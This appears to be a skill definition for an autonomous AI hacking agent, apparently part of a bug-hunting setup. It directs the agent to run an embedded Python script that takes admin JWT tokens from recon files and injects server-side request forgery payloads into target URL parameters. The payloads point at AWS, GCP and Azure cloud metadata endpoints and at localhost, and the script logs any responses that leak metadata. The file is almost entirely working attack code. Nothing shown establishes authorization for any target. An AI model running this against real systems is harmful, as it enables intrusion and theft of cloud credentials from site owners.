---
name: attack-ssrf
description: SSRF in URL params, webhooks, imports, callbacks. Cloud metadata pivot. MUST BE USED when url/redirect/callback params found.
---
Read ~/new_agent/.claude/AGENT-SHARED.md
Read ~/new_agent/.claude/skills/hunt-ssrf/SKILL.md
Read ~/new_agent/.claude/skills/hunt-metadata-ssrf/SKILL.md

TARGET=$(cat ~/new_agent/state/.active-target)

python3 << 'PYEOF'
import sys, json, time, os
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp
sh = SafeHttp(allow_raw_for_waf=True)

TARGET  = open('/home/hunter/new_agent/state/.active-target').read().strip()
tokens  = json.load(open(f'/home/hunter/new_agent/targets/{TARGET}/recon/tokens.json'))
QUEUE   = '/home/hunter/new_agent/state/queue.jsonl'
RESULTS = f'/home/hunter/new_agent/results/{TARGET}'
os.makedirs(RESULTS, exist_ok=True)

jwt = tokens.get('ADMIN', {}).get('jwt', '')
headers = {"Authorization": f"Bearer {jwt}"} if jwt else {}

SSRF_PARAMS = ['url','redirect','callback','webhook','import','fetch','load','src','dest','target','path','uri']
SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'http://127.0.0.1:80/',
    'http://[::1]:80/',
]

with open(f'/home/hunter/new_agent/targets/{TARGET}/recon/params.txt') as f:
    for line in f:
        line = line.strip()
        if not line: continue
        for param in SSRF_PARAMS:
            if param in line.lower():
                for payload in SSRF_PAYLOADS:
                    try:
                        test_url = f"{line}&{param}={payload}" if '?' in line else f"{line}?{param}={payload}"
                        r = sh.request("GET", test_url, headers=headers)
                        if any(kw in r.text.lower() for kw in ['ami-id','computemetadata','instance-id','metadata']):
                            finding = {"event":"finding_found","type":"ssrf","url":test_url,
                                      "payload":payload,"response":r.text[:150]}
                            with open(f'{RESULTS}/attack-ssrf-{int(time.time())}.json','w') as out:
                                json.dump(finding, out, indent=2)
                            with open(QUEUE,'a') as q:
                                q.write(json.dumps({"event":"finding_found","type":"ssrf","url":test_url})+'\n')
                    except: pass
PYEOF
